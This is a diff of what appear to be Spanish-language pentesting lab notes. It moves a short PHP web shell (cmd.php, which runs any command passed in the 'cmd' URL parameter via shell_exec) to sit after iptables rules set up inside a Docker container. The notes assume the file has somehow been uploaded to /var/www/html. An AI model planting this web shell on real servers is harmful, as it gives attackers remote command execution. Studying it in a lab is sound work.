@@ -1988,6 +1988,21 @@ docker exec -it myContainer bash
 iptables --flush # Si da problemas no corriste bien la flag en el docker
 iptables -A OUTPUT -p tcp -m tcp -o eth0 --sport 80 -j ACCEPT
 iptables -A OUTPUT -o eth0 -j DROP
+cd /var/www/html
+nano cmd.php
+# Suponemos que de alguna forma subimos un archivo php a este directorio
+# El archivo es el siguiente
+-----cmd.php
+<?php
+
+if (isset($_GET['cmd'])){
+    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
+} else {
+    echo "Use like this: ?cmd=dir or ?cmd=ls";
+}
+
+?>
+-----cmd.php
 
 
 
@@ -2000,17 +2015,7 @@ cd /var/www/html
 # suponemos que de alguna forma subimos un archivo php a este directorio
 nano cmd.php
 
------cmd.php
-<?php
 
-if (isset($_GET['cmd'])){
-    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
-} else {
-    echo "Use like this: ?cmd=dir or ?cmd=ls";
-}
-
-?>
------cmd.php
 
 ls
 rm index.html
